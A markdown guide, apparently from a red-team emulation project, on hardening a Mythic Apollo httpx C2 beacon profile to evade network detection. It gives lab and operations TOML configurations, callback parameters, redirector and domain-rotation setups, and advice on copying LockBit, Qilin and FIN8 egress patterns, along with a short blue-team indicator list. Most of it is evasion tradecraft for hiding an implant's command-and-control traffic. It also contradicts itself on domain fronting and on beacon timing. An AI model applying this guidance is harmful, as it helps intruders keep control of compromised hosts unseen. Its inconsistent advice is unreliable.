# Apollo HTTPX OPSEC Hardening Guide

## Current Configuration Assessment

**Lab/Testing:** ✓ Safe  
**Real Operations:** ✗ NOT Safe - Multiple detectable artifacts

### Detected Indicators

| Indicator | Current Config | Detection Risk | Notes |
|-----------|---------------|----|-------|
| **JA4H (HTTP client) vs User-Agent** | .NET runtime fingerprint under a browser UA | 🔴 Critical — **UNFIXABLE at httpx/managed-agent layer** | The strongest Mythic tell (detections **N1**). Apollo is .NET FW; its `HttpClient` JA4H says .NET while the UA claims Chrome. **No amount of UA/port/transform hardening changes this** — it requires a native agent (Xenon/Kharon). Do not treat UA/port fixes as "hardened" while this stands. |
| **Port** | 82 (HTTP) | 🔴 Critical | Non-standard, anomalous in network logs |
| **Domain** | cdn.examplestatic.io | 🔴 Critical | Fake/spoofed, obvious to inspection |
| **Protocol** | HTTP unencrypted outer | 🟠 High | Pattern visible in packet capture |
| **Transforms** | Base64 only | 🟠 High | Signature well-known to IDS/EDR |
| **URIs** | Single `/js/lib.min.js` | 🟠 High | Repetitive, abnormal behavior |
| **User-Agent** | Default/missing | 🟠 High | Doesn't match browser behavior |
| **Domain Front** | None | 🟡 Medium | Direct connection to callback IP visible |
| **Jitter** | 37% | 🟢 Low | Reasonable randomization |

## Hardening Options

### Option 1: Lab Setup (Current)
**Files:**
- `generic_cdn_beacon.lab.toml` - Basic configuration

**Use Case:** Training, testing, CTF challenges  
**Risk:** High detection if used against real security monitoring

### Option 2: OPSEC-Hardened (Recommended for ops)
**File:** `generic_cdn_beacon.ops.toml`

**Improvements:**
1. ✓ Real browser User-Agent (Chrome 120.0)
2. ✓ Legitimate URI patterns (CDN JS files)
3. ✓ Varied URIs (multiple resources)
4. ✓ Advanced transforms (XOR + Base64url)
5. ✓ Realistic headers (Accept, Cache-Control, ETag)
6. ✓ POST variety (analytics, beacon endpoints)
7. ✓ Realistic server response headers (nginx)

**Remaining Issues (must configure separately):**
- Port 82 → must change to 443 or 80 in payload params
- Domain → redirector FQDN on 443 (aged registered domain you own); NOT fronting/CDN (F6)
- Callback endpoint → needs to be legitimate-looking service

## Deployment Comparison

### Basic Config (Lab Testing)

```toml
# generic_cdn_beacon.lab.toml
name = "generic_cdn_beacon"
[get]
uris = ["/js/lib.min.js"]
[get.client]
headers.Host = "cdn.examplestatic.io"
[[get.client.transforms]]
action = "base64"
```

**Payload Parameters:**
```
Callback Domain: http://10.23.20.10:82
Callback Interval: 62s
Callback Jitter: 37%
```

**Risks:**
- Port 82 anomalous
- Domain fake
- Single URI repetitive
- No UA spoofing

---

### Hardened Config (Operations)

```toml
# generic_cdn_beacon.ops.toml
name = "generic_cdn_beacon"
[get]
uris = ["/cdn/jquery.min.js", "/assets/bootstrap.min.js", "/js/app.bundle.js"]
[get.client]
headers.User-Agent = "Mozilla/5.0... Chrome/120.0.0.0..."
[[get.client.transforms]]
action = "xor"
value = "SET_PER_OP_RANDOM"
[[get.client.transforms]]
action = "base64url"
```

**Payload Parameters:**
```
Callback Domain: https://<REDIR_FQDN>:443 (redirector, real LE cert)
Callback Interval: 45-90s (randomized)
Callback Jitter: 50%
Domain Rotation: fail-over (to backup domains)
```

**Improvements:**
- Port 443 (HTTPS standard)
- Redirector on 443 with a real LE cert (normalises TLS -> N6); NOT a real CDN (F6)
- Multiple URIs (3 variations)
- Realistic User-Agent
- XOR + Base64url (harder to detect)
- Varied POST endpoints
- Realistic headers

---

## OPSEC Hardening Checklist

### Detection priority — fix in THIS order (F7)

A mature blue team almost never catches you on body encoding. Reordering base64/xor moves
**zero** of the analytics in `../detections/elastic-sysmon.md`. Prioritise by what actually
detects a beacon:

1. **Client fingerprint (JA4H / JARM / JA3S)** — highest fidelity. A .NET JA4H under a browser
   User-Agent (N1) is the strongest Mythic tell and is **unfixable at the httpx/managed-agent
   layer** (see the JA4H row in the Detected Indicators table, F8). This dominates everything below.
2. **Timing model** — long, high-jitter, low-volume sleeps starve RITA (N2); short/periodic does
   not. Match the *actor's* cadence, don't invent one (see Behavioral, below).
3. **Infrastructure consistency** — Host/SNI/destination-ASN agreement (N4), real cert on the
   redirector (N6), low URI cardinality (N3). This is where a redirector earns its keep.
4. **Body encoding (xor/base64/base64url)** — lowest fidelity. Do it for correctness, not evasion;
   the key MUST be per-op random (never a framework name — see Traffic-Level, below).

### Network-Level Evasion

- [ ] **Use port 443** instead of 82
  - Command: Payload → httpx_callback_domains: `https://[real-domain]:443`
  
- [ ] **Egress shape — actor-accurate, NOT domain fronting** (F6)
  - Domain fronting is **dead** on the majors (Cloudflare 2015; CloudFront/Google 2018; Azure
    Front Door Jan 2024; Fastly Feb 2024). Do not rely on it, and never point callback at a real CDN
  - LockBit: fail-over across 2-3 **aged registered** redirector domains you own (Host spoof is in
    the profile). Qilin: forged `ocsp.verisign.com` on your own VPS. FIN8: `sslip.io` wildcard IP
    naming + 3-server fallback (and note FIN8 is non-TLS binary — Track-2 build, F1)
  
- [ ] **Use HTTPS** instead of HTTP
  - Requires valid certificate or self-signed (with pinning bypass)
  
- [ ] **Callback domain — your redirector, actor-shaped** (F6)
  - ✓ Redirector FQDN on 443 with a real LE cert (aged/categorised registered domain you own)
  - ✓ Actor-accurate egress per the item above
  - ✗ Pointing callback at a real CDN (jsDelivr/unpkg/cdnjs) — you cannot C2 *through* it
  - ✗ Fake `example.com` domains; ✗ raw IP / non-standard port

### Traffic-Level Evasion

- [ ] **Multiple URIs** in rotation
  - Already in hardened config
  - Gets randomized per request
  
- [ ] **Transforms** (XOR + Base64url) — *lowest-fidelity control; do not overweight*
  - Already in the ops config
  - Does **not** move periodicity (N2) or fingerprint (N1) detections — see Detection priority
  - **XOR key MUST be per-op random** (`openssl rand -hex 16`). Never `"mythic"` or any framework
    name: a static/known key is a self-identifying IOC recoverable from one known-plaintext block
    (fixed in `c2_profile/generic_cdn_beacon.ops.toml`, F7)
  
- [ ] **Realistic User-Agent**
  - Already in hardened config
  - Chrome 120 matches common browsers
  
- [ ] **Realistic headers**
  - Already in hardened config
  - Accept, Cache-Control, ETag, etc.

### Behavioral Evasion

- [ ] **Actor-specific callback interval** (not a generic 60s/50%)
  - Match the modeled actor: **LockBit ICBC = interval `62` / jitter `37`** (the documented
    value; already in `../profiles/lockbit-icbc.httpx.toml` and `generic_cdn_beacon.ops.toml`, F7)
  - Jitter does **not** defeat RITA (N2) — it perturbs the interval, not the population rhythm.
    The real timing evasion is *long, high-jitter, low-volume* sleep, which forces the SOC to
    lengthen its window. Emulate the actor's real cadence; treat N2 firing as the lesson, not a fail
  
- [ ] **Domain rotation across multiple domains**
  - Command: Payload → httpx_domain_rotation: `round-robin`
  - Requires 2+ domains in callback_domains list
  
- [ ] **Different POST endpoints**
  - Already in hardened config
  - `/api/v1/analytics` and `/beacon/report`

### Encryption & Authentication

- [ ] **EKE (Encrypted Key Exchange)** enabled
  - Command: Payload → httpx_encrypted_exchange_check: `true`
  - ✓ Already configured
  
- [ ] **AES256_HMAC session encryption**
  - Default in Mythic (aes256_hmac)
  - ✓ Already configured

---

## Payload Generation Examples

### Lab Testing (Port 82, example domain)
```
Payload Type: apollo
C2 Profile: httpx
raw_c2_config: generic_cdn_beacon.lab.toml
Callback Domain: http://10.23.20.10:82
Callback Interval: 62
Callback Jitter: 37
Encrypted Exchange Check: true
```

**Result:** Works in lab, obvious to network monitoring

---

### OPSEC Operations (Port 443, real domain)
```
Payload Type: apollo
C2 Profile: httpx
raw_c2_config: generic_cdn_beacon.ops.toml
Callback Domain: https://<REDIR_FQDN>:443
Callback Interval: 60
Callback Jitter: 50
Domain Rotation: round-robin
Failover Threshold: 5
Encrypted Exchange Check: true
```

**Result:** Blends with legitimate CDN traffic, harder to detect

---

### Redirector Setup (Advanced OPSEC)
```
Callback Domain: https://yourdomain.com:443 (redirector)
Domain Front: cdnjs.cloudflare.com (CDN front)
Callback Interval: 45-90 (randomized)
Callback Jitter: 60%
```

**Architecture:**
```
Apollo Agent
    ↓ (HTTPS to yourdomain.com)
Redirector (Apache mod_rewrite)
    ↓ (Forwards to Mythic)
Mythic Server
    ↓ (Response through redirector)
Apollo Agent
```

---

## Detection Methods (Blue Team Perspective)

### High Confidence Indicators
- [ ] Port 82 HTTP beaconing
- [ ] `cdn.examplestatic.io` DNS resolution
- [ ] Repeated single URI pattern
- [ ] Base64 patterns in HTTP body
- [ ] Missing/default User-Agent

### Medium Confidence Indicators
- [ ] Regular 62-second intervals
- [ ] Specific User-Agent across multiple hosts
- [ ] Consistent POST body size
- [ ] Anomalous Accept headers

### Low Confidence Indicators
- [ ] HTTPS to legitimate CDN
- [ ] Variable User-Agents
- [ ] Randomized intervals
- [ ] Mixed GET/POST requests

---

## Accepted / out-of-scope IOCs (F3)

Some real-actor IOCs **cannot** be reproduced by Apollo (a .NET/SChannel managed agent) and are
logged here as accepted gaps rather than forced. The blue team should know these are NOT exercised
by this agent, so "hunt for them" is not a test this lab passes or fails.

| IOC | Actor | Why not reproduced | Disposition |
|---|---|---|---|
| **JA3 `a0e9f5d64349fb13191bc781f81f42e1`** | LockBit (recovered CS beacon) | Apollo is .NET FW / SChannel; it emits a **.NET** JA3/JA4H, not the Cobalt Strike malleable JA3. The client TLS stack is not shapeable at the managed-agent layer. | **Accepted, out of scope.** Reproducing it requires a native agent (Xenon/Kharon) — a Track-2 decision, not an httpx tweak. Meanwhile N1 (JA4H-vs-UA) still fires. |

## Testing & Validation

Before operational deployment, verify:

1. **Profile loads without errors**
   - ✓ Config Check: "Everything matches and looks good!"

2. **Payload builds successfully**
   - ✓ Build command completes

3. **Callback registration works**
   - Agent executes → appears in Mythic UI within interval+jitter

4. **Task execution functions**
   - Queue shell whoami → results return within one checkin cycle

5. **Encryption active**
   - Mythic shows: "Encrypted Exchange Check: true"
   - Network traffic is encrypted (not visible plaintext)

6. **Behavior normal**
   - Beacon intervals follow configured pattern
   - URIs rotate through list
   - Headers look realistic

---

## Files Reference

| File | Purpose | Use Case |
|------|---------|----------|
| `generic_cdn_beacon.lab.toml` | Basic working config | Lab/Testing |
| `generic_cdn_beacon.ops.toml` | Hardened for operations | Red Team ops |

---

## Recommendations

**For Lab/CTF:** Use `generic_cdn_beacon.lab.toml` - focus on functionality

**For Red Team:** Use `generic_cdn_beacon.ops.toml` + adjust:
1. Change port 82 → 443
2. Use your redirector FQDN on 443 (aged registered domain); NOT a real CDN / fronting (F6)
3. Use the actor's documented cadence (LockBit 62s/37%), not a generic 50%+ (F7)
4. Add domain rotation

**For Evasion:** Add redirector layer:
1. Own domain on redirector server
2. Domain front to legitimate CDN
3. Mythic listens on internal network only
4. Redirector forwards traffic through mod_rewrite/Nginx

---

**Status:** Production guidance  
**Last Updated:** 2026-08-25  
**Tested:** Lab environment only
